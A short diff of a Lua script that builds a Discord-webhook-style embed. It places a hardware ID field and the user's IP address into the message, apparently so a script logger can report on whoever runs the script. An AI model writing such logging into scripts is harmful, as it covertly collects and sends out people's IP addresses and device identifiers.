@@ -28,13 +28,13 @@ local data =
         ["content"] = null,
         
         ["embeds"] = {
-            {
-                ["title"] = "**script executed**",
+            {   
+                ["title"] = slf,
                 ["description"] = "",
                 ["color"] = tonumber(0),        
                 ['fields'] = {
                     {
-                        ["name"] = slf,
+                        ["name"] = hwid,
                         ["value"] = ip,
                         ["inline"] = true
                     },
